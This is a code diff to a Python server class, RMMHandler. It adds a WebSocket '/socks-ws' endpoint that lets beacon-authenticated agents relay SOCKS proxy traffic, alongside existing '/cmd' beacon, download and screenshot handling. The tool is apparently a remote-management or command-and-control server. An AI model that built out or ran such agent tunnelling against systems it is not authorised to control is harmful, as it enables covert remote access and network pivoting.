@@ -931,6 +931,44 @@ class RMMHandler(BaseHTTPRequestHandler):
             ws.close()
         return True
 
+    def _handle_socks_agent_websocket(self, session_id: str) -> bool:
+        """Agent SOCKS relay channel (beacon auth). Main /cmd beacon stays HTTP."""
+        ws = WebSocketConnection.from_http_request(
+            self.connection,
+            {k: self.headers[k] for k in self.headers},
+            self.path,
+        )
+        if not ws:
+            self._respond(400, "WebSocket handshake failed")
+            return True
+        self.server_instance.touch_session(session_id)
+        if not self.server_instance.socks.attach_agent_ws(session_id, ws):
+            ws.close()
+            self._respond(403, "SOCKS relay not active")
+            return True
+        self.close_connection = False
+        try:
+            while self.server_instance.running and not ws.closed:
+                msg = ws.recv_json()
+                if msg is None:
+                    break
+                if msg.get("op") == "_timeout":
+                    continue
+                if msg.get("op") == "ping":
+                    ws.send_json({"op": "pong"})
+                    continue
+                if msg.get("op") == "responses":
+                    responses = msg.get("responses")
+                    if isinstance(responses, list):
+                        self.server_instance.socks.submit_agent_responses(
+                            session_id, responses
+                        )
+                    continue
+        finally:
+            self.server_instance.socks.detach_agent_ws(session_id, ws)
+            ws.close()
+        return True
+
     def _serve_artifact(self, kind: str, filename: str):
         if kind not in ("downloads", "screenshots"):
             self._json(404, {"error": "not_found"})
@@ -1319,7 +1357,7 @@ class RMMHandler(BaseHTTPRequestHandler):
         if self._serve_web(path):
             return
         
-        if path in ("/register", "/cmd", "/ping", "/socks"):
+        if path in ("/register", "/cmd", "/ping", "/socks", "/socks-ws"):
             if not self._beacon_authorized(qs):
                 self._beacon_forbidden()
                 return
@@ -1397,6 +1435,17 @@ class RMMHandler(BaseHTTPRequestHandler):
                     json.dumps({"active": active, "tasks": tasks}),
                     "application/json",
                 )
+
+        elif path == "/socks-ws":
+            err, session_id = self._beacon_session_id_from_qs(qs)
+            if err:
+                self._respond(400, err)
+            elif self.headers.get("Upgrade", "").lower() != "websocket":
+                self._respond(426, "Upgrade Required")
+            elif not self.server_instance.socks_active(session_id):
+                self._respond(403, "SOCKS relay not active")
+            else:
+                self._handle_socks_agent_websocket(session_id)
         
         else:
             self._respond(404, "Not Found")
